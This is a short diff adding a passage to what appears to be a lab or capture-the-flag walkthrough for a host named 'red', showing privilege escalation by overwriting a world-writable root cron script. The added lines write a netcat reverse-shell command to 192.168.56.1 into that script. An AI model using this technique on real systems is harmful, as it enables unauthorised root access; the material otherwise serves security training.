@@ -555,4 +555,18 @@ peter@red ~ % sudo -s
 root@red ~ # id
 uid=0(root) gid=0(root) groups=0(root)
 
+#way of crontab
+www-data@red:/etc/cron.d$ cat logrotate
+cat logrotate
+
+*/5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh
+www-data@red:/etc/cron.d$ ls -la /usr/local/sbin/
+ls -la /usr/local/sbin/
+total 12
+drwxr-xr-x  2 root root 4096 Jun  3  2016 .
+drwxr-xr-x 10 root root 4096 Jun  3  2016 ..
+-rwxrwxrwx  1 root root   51 Jun  3  2016 cron-logrotate.sh
+www-data@red:/etc/cron.d$ echo "nc.tranditional 192.168.56.1 2212 -e /bin/bash" > /usr/local/sbin/cron-logrotate.sh    
+<68.56.1 2212 -e /bin/bash" > /usr/local/sbin/cron-logrotate.sh  
+
 
